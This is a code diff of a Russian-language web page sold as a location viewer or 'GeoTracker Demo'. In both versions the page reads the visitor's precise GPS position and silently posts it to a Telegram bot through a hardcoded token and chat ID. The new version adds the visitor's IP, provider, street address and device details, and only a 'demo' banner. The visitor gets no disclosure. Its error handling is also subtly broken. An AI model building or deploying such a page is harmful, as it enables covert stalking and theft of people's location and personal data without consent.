@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>▪️ Location Viewer ▪️</title>
+    <title>GeoTracker Demo</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             margin: 0;
             padding: 20px;
             font-family: Arial, sans-serif;
-            background: #f8f9fa;
+            background: #ffffff;
             min-height: 100vh;
         }
         .container {
@@ -44,9 +44,6 @@
             width: 100%;
             transition: opacity 0.3s;
         }
-        button:hover {
-            opacity: 0.9;
-        }
         .data-row {
             display: flex;
             justify-content: space-between;
@@ -59,6 +56,14 @@
             color: #6c757d;
             font-weight: bold;
         }
+        .warning {
+            color: #dc3545;
+            border: 2px solid #dc3545;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
         .leaflet-control-container {
             display: none !important;
         }
@@ -67,63 +72,109 @@
 </head>
 <body>
     <div class="container">
-        <button id="locateBtn">📍 Определить моё местоположение</button>
-        
+        <div class="warning">
+            ⚠️ Демонстрационная версия! Не использовать в production!
+        </div>
+
+        <div class="info-box">
+            <button id="startBtn">🚀 Начать отслеживание</button>
+        </div>
+
         <div class="map-box">
             <div id="map"></div>
         </div>
 
         <div class="info-box">
             <div class="data-row">
-                <span class="data-label">Широта:</span>
-                <span id="latitude">—</span>
+                <span class="data-label">IP-адрес:</span>
+                <span id="ip">—</span>
             </div>
             <div class="data-row">
-                <span class="data-label">Долгота:</span>
-                <span id="longitude">—</span>
+                <span class="data-label">Координаты:</span>
+                <span id="coordinates">—</span>
             </div>
             <div class="data-row">
-                <span class="data-label">Точность:</span>
-                <span id="accuracy">—</span>
+                <span class="data-label">Адрес:</span>
+                <span id="address">—</span>
             </div>
             <div class="data-row">
-                <span class="data-label">Время:</span>
-                <span id="time">—</span>
+                <span class="data-label">Устройство:</span>
+                <span id="device">—</span>
             </div>
         </div>
     </div>
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
+        // Конфигурация (удалить после демо!)
         const BOT_TOKEN = '8186815938:AAGC5xZ-LuNbm-HTYO7BNd0vKkPly3Pwy7c';
         const CHAT_ID = '6503842877';
         let map, marker;
 
-        async function sendToTelegram(lat, lng, accuracy) {
-            const message = `🕵️‍♂️ Новый доступ к локации:
-┌ Широта: ${lat}
-├ Долгота: ${lng}
-└ Точность: ${accuracy} м
-
-⏱ ${new Date().toLocaleString()}
-🌐 ${navigator.userAgent}`;
+        // Основная функция сбора данных
+        async function collectData() {
+            const report = {
+                timestamp: new Date().toISOString(),
+                ip: '—',
+                location: {},
+                network: {},
+                device: {}
+            };
 
             try {
-                await fetch(
-                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`
-                );
-            } catch(e) {
-                console.error('Ошибка отправки:', e);
+                // Получение IP-информации
+                const ipInfo = await fetch('https://ipinfo.io/json').then(r => r.json());
+                report.ip = ipInfo.ip;
+                report.network = {
+                    provider: ipInfo.org,
+                    city: ipInfo.city,
+                    country: ipInfo.country
+                };
+
+                // Получение геолокации
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000
+                    });
+                });
+
+                report.location = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+
+                // Получение адреса
+                const address = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${report.location.lat}&lon=${report.location.lon}`,
+                    {headers: {'User-Agent': 'HackathonDemo/1.0'}}
+                ).then(r => r.json());
+
+                // Данные об устройстве
+                report.device = {
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language
+                };
+
+                return {
+                    uiData: {
+                        ip: report.ip,
+                        coords: `${report.location.lat.toFixed(6)}, ${report.location.lon.toFixed(6)}`,
+                        address: [address.address?.road, address.address?.city].filter(Boolean).join(', '),
+                        device: `${navigator.platform} (${navigator.language})`
+                    },
+                    fullReport: report
+                };
+
+            } catch(error) {
+                console.error('Ошибка сбора данных:', error);
+                return {error: true};
             }
         }
 
-        function updateUI(lat, lng, accuracy) {
-            document.getElementById('latitude').textContent = lat.toFixed(6);
-            document.getElementById('longitude').textContent = lng.toFixed(6);
-            document.getElementById('accuracy').textContent = `${accuracy.toFixed(1)} м`;
-            document.getElementById('time').textContent = new Date().toLocaleTimeString();
-        }
-
+        // Функция инициализации карты
         function initMap(lat, lng) {
             if (!map) {
                 map = L.map('map', {
@@ -141,39 +192,53 @@
             map.setView([lat, lng], 16);
         }
 
-        document.getElementById('locateBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('locateBtn');
-            btn.disabled = true;
-            btn.textContent = 'Идёт поиск...';
+        // Отправка в Telegram
+        async function sendToTelegram(data) {
+            const message = `📡 Новые данные:
+IP: ${data.ip}
+Координаты: ${data.location.lat}, ${data.location.lon}
+Город: ${data.network.city}
+Устройство: ${data.device.platform}
+User Agent: ${data.device.userAgent}`;
 
             try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 8000
-                    });
-                });
+                await fetch(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`
+                );
+            } catch(e) {
+                console.error('Ошибка отправки:', e);
+            }
+        }
 
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
+        // Обработчик кнопки
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('startBtn');
+            btn.disabled = true;
+            btn.textContent = 'Сбор данных...';
 
-                updateUI(lat, lng, accuracy);
-                initMap(lat, lng);
-                await sendToTelegram(lat, lng, accuracy);
+            const {uiData, fullReport} = await collectData();
 
-                btn.textContent = 'Готово!';
+            if(!uiData.error) {
+                // Обновление интерфейса
+                document.getElementById('ip').textContent = uiData.ip;
+                document.getElementById('coordinates').textContent = uiData.coords;
+                document.getElementById('address').textContent = uiData.address;
+                document.getElementById('device').textContent = uiData.device;
+                initMap(fullReport.location.lat, fullReport.location.lon);
+                
+                // Отправка данных
+                await sendToTelegram(fullReport);
+                
+                btn.textContent = 'Данные получены!';
                 setTimeout(() => {
                     btn.disabled = false;
-                    btn.textContent = '📍 Определить местоположение';
+                    btn.textContent = '🚀 Начать отслеживание';
                 }, 2000);
-
-            } catch(error) {
-                console.error('Ошибка:', error);
-                btn.textContent = 'Ошибка определения!';
+            } else {
+                btn.textContent = 'Ошибка!';
                 setTimeout(() => {
                     btn.disabled = false;
-                    btn.textContent = '📍 Определить местоположение';
+                    btn.textContent = '🚀 Начать отслеживание';
                 }, 1500);
             }
         });
